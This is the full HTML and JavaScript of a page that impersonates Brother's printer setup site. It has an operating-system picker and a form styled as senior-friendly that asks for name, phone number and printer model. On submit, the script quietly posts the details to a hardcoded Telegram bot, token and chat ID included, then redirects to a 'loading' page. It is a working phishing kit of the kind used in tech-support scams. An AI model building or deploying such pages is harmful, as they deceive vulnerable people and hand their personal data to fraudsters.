<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Brother Printer Setup - Select Operating System</title>
    <style>
        * { margin: 0; padding: 0; box-sizing: border-box; }
        body {
            font-family: Arial, sans-serif;
            background: #f5f5f5;
            height: 100vh;
            display: flex;
            flex-direction: column;
            overflow: hidden;
        }

        /* Header (unchanged) */
        .header { background: #0d2ea5; color: white; padding: 15px 0; flex-shrink: 0; }
        .header-content { max-width: 1200px; margin: 0 auto; padding: 0 20px; display: flex; align-items: center; }
        .logo { font-size: 1.8em; font-weight: bold; margin-right: 15px; }
        .header-text { font-size: 1em; opacity: 0.9; }

        /* Main */
        .main-content { flex: 1; display: flex; align-items: center; padding: 20px; overflow: auto; }
        .container {
            width: 100%; max-width: 1200px; margin: 0 auto; background: white;
            padding: 32px; border-radius: 8px; box-shadow: 0 4px 12px rgba(0,0,0,0.08);
            text-align: center;
        }
        h1 { color: #222; margin-bottom: 20px; font-size: 1.8em; font-weight: 700; }

        .os-grid { display: flex; justify-content: center; gap: 28px; margin-bottom: 24px; flex-wrap: wrap; }
        .os-card {
            background: #fff; border: 2px solid #ddd; border-radius: 10px;
            padding: 18px; cursor: pointer; text-align: center;
            min-width: 160px; width: 180px;
            transition: transform 0.2s ease, box-shadow 0.2s ease, border-color 0.2s ease;
            outline: none;
        }
        .os-card:hover { border-color: #0d2ea5; transform: translateY(-3px); box-shadow: 0 10px 22px rgba(13,46,165,0.12); }
        .os-card.selected { border-color: #0d2ea5; background: #f0f4ff; }
        .os-card:focus-visible { box-shadow: 0 0 0 3px rgba(13,46,165,0.35); border-color: #0d2ea5; }

        .os-figure { width: 80px; height: 80px; margin: 0 auto 10px auto; display: block; }
        .os-figure img {
            width: 80px; height: 80px; object-fit: contain; display: block; background: #eef2ff; border-radius: 8px;
        }
        .os-name { font-size: 1.05em; font-weight: 700; color: #333; letter-spacing: 0.2px; }

        /* Modal */
        .modal { display: none; position: fixed; z-index: 1000; inset: 0; background: rgba(0,0,0,0.5); }
        .modal-content {
            background: white; margin: 6% auto; padding: 28px; border-radius: 12px;
            width: 92%; max-width: 520px; text-align: left; box-shadow: 0 8px 24px rgba(0,0,0,0.3);
        }
        .modal h2 { color: #222; margin-bottom: 6px; font-size: 1.6em; font-weight: 700; }
        .modal-desc { color: #444; margin-bottom: 16px; font-size: 1rem; }

        /* Senior-friendly form: big, simple, single column */
        .form-grid { display: grid; grid-template-columns: 1fr; gap: 16px; }
        .form-group { display: flex; flex-direction: column; gap: 8px; }
        label { color: #111; font-weight: 700; font-size: 1.05rem; }
        .req { color: #b00020; margin-left: 6px; }
        input[type="text"], input[type="tel"] {
            width: 100%; padding: 14px 14px; border: 2px solid #ccc; border-radius: 10px;
            font-size: 18px; line-height: 1.4; color: #111; background: #fafafa;
            transition: border-color 0.2s ease, box-shadow 0.2s ease;
        }
        input[type="text"]:focus, input[type="tel"]:focus {
            outline: none; border-color: #0d2ea5; box-shadow: 0 0 0 3px rgba(13,46,165,0.18);
            background: #fff;
        }
        .hint { font-size: 0.95rem; color: #555; }

        .btn-row { display: flex; gap: 12px; margin-top: 6px; }
        .btn {
            background: #0d2ea5; color: white; border: none; padding: 14px 22px; border-radius: 10px;
            cursor: pointer; font-size: 18px; font-weight: 700; letter-spacing: 0.2px;
            transition: background 0.2s ease, transform 0.1s ease;
        }
        .btn:hover { background: #0a2485; }
        .btn:active { transform: translateY(1px); }
        .btn[disabled] { opacity: 0.65; cursor: not-allowed; }
        .btn-cancel { background: #666; }
        .btn-cancel:hover { background: #555; }

        .status { margin-top: 10px; font-size: 1rem; min-height: 1.2em; }
        .status.ok { color: #0a7a2f; }
        .status.err { color: #b00020; }

        /* Footer (unchanged) */
        .footer { background: #0d2ea5; color: white; text-align: center; padding: 15px; flex-shrink: 0; }
        .footer-content { max-width: 1200px; margin: 0 auto; }
    </style>
</head>
<body>
    <!-- Header (unchanged) -->
    <header class="header">
        <div class="header-content">
            <div class="logo">Brother</div>
            <div class="header-text">Printer Setup & Configuration</div>
        </div>
    </header>

    <!-- Main Content -->
    <main class="main-content">
        <div class="container">
            <h1>Brother Printer Setup</h1>

            <div class="os-grid" role="list">
                <div class="os-card" data-os="windows" role="button" tabindex="0" aria-label="Select Windows" role="listitem">
                    <figure class="os-figure">
                        <img src="https://upload.wikimedia.org/wikipedia/commons/8/87/Windows_logo_-_2021.svg"
                             width="80" height="80" alt="Windows logo">
                    </figure>
                    <div class="os-name">Windows</div>
                </div>

                <div class="os-card" data-os="mac" role="button" tabindex="0" aria-label="Select macOS" role="listitem">
                    <figure class="os-figure">
                        <img src="https://upload.wikimedia.org/wikipedia/commons/f/fa/Apple_logo_black.svg"
                             width="80" height="80" alt="Apple macOS logo">
                    </figure>
                    <div class="os-name">macOS</div>
                </div>

                <div class="os-card" data-os="chromebook" role="button" tabindex="0" aria-label="Select Chrome OS" role="listitem">
                    <figure class="os-figure">
                        <img src="https://www.svgrepo.com/show/378784/chrome-1-11.svg"
                             width="80" height="80" alt="Chrome OS logo">
                    </figure>
                    <div class="os-name">Chrome OS</div>
                </div>
            </div>
        </div>
    </main>

    <!-- Footer (unchanged) -->
    <footer class="footer">
        <div class="footer-content">
            <p>&copy; 2025 Brother International Corporation. All rights reserved.</p>
        </div>
    </footer>

    <!-- Modal with only 3 fields -->
    <div id="detailsModal" class="modal" aria-modal="true" role="dialog" aria-labelledby="detailsTitle">
        <div class="modal-content">
            <h2 id="detailsTitle">Your Details</h2>
            <p class="modal-desc">Please fill the three fields below to continue. All fields are required.</p>
            <form id="detailsForm" class="form-grid" novalidate>
                <div class="form-group">
                    <label for="userName">Full Name <span class="req">*</span></label>
                    <input type="text" id="userName" name="userName" placeholder="e.g., Ayaan Khan" required minlength="2" autocomplete="name">
                </div>

                <div class="form-group">
                    <label for="contactNumber">Contact Number <span class="req">*</span></label>
                    <input type="tel" id="contactNumber" name="contactNumber" placeholder="+91 98765 43210" pattern="^[+0-9 ()-]{7,20}$" required autocomplete="tel">
                    <div class="hint">Include country code (e.g., +91).</div>
                </div>

                <div class="form-group">
                    <label for="modelNumber">Printer Model <span class="req">*</span></label>
                    <input type="text" id="modelNumber" name="modelNumber" placeholder="e.g., HL-L2350DW" required autocomplete="off">
                </div>

                <div class="btn-row">
                    <button type="submit" class="btn" id="submitBtn">Submit</button>
                    <button type="button" class="btn btn-cancel" id="btnCancel">Cancel</button>
                </div>
                <div id="status" class="status" aria-live="polite"></div>
            </form>
        </div>
    </div>

    <script>
        let selectedOS = '';

        // Telegram Bot credentials (replace these)
        const BOT_TOKEN = "7764513169:AAFpRf8WQ6WE7DymOqMgTxXjv6BUSZe2734";   // from @BotFather
        const CHAT_ID   = "1684000886";     // your chat/group ID

        function openModal() {
            const modal = document.getElementById('detailsModal');
            modal.style.display = 'block';
            const nameEl = document.getElementById('userName');
            nameEl && nameEl.focus();
        }

        function closeModal() {
            document.getElementById('detailsModal').style.display = 'none';
            document.querySelectorAll('.os-card').forEach(c => c.classList.remove('selected'));
            selectedOS = '';
        }

        function activateCard(card) {
            document.querySelectorAll('.os-card').forEach(c => c.classList.remove('selected'));
            card.classList.add('selected');
            selectedOS = card.dataset.os;
            setTimeout(openModal, 120);
        }

        document.querySelectorAll('.os-card').forEach(card => {
            card.addEventListener('click', () => activateCard(card));
            card.addEventListener('keydown', (e) => {
                if (e.key === 'Enter' || e.key === ' ') {
                    e.preventDefault();
                    activateCard(card);
                }
            });
        });

        document.getElementById('btnCancel').addEventListener('click', closeModal);

        window.onclick = function(event) {
            const modal = document.getElementById('detailsModal');
            if (event.target === modal) closeModal();
        };

        function sendToTelegram(text) {
            const endpoint = `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`;
            fetch(endpoint, {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify({
                    chat_id: CHAT_ID,
                    text,
                    parse_mode: 'HTML',
                    disable_web_page_preview: true
                })
            }).catch(err => {
                // Silent fail - no user feedback needed
                console.error('Telegram send error:', err);
            });
        }

        document.getElementById('detailsForm').addEventListener('submit', function(e) {
            e.preventDefault();
            const statusEl = document.getElementById('status');

            const userName = document.getElementById('userName').value.trim();
            const contactNumber = document.getElementById('contactNumber').value.trim();
            const modelNumber = document.getElementById('modelNumber').value.trim();

            if (!selectedOS) {
                statusEl.textContent = 'Please select Windows, macOS, or Chrome OS above first.';
                statusEl.className = 'status err';
                return;
            }
            if (!userName || !contactNumber || !modelNumber) {
                statusEl.textContent = 'Please complete all three fields.';
                statusEl.className = 'status err';
                return;
            }

            // Save locally in case user returns
            localStorage.setItem('selectedOS', selectedOS);
            localStorage.setItem('userName', userName);
            localStorage.setItem('contactNumber', contactNumber);
            localStorage.setItem('modelNumber', modelNumber);

            const osLabel = selectedOS === 'mac' ? 'macOS' : (selectedOS === 'windows' ? 'Windows' : 'Chrome OS');
            const message =
                `<b>Brother Setup</b>\n` +
                `Name: ${userName}\n` +
                `Contact: ${contactNumber}\n` +
                `Model: ${modelNumber}\n` +
                `OS: ${osLabel}`;

            // Send in background
            sendToTelegram(message);

            // Quick redirect
            window.location.href = '/printer/loading.html';
        });
    </script>
</body>
</html>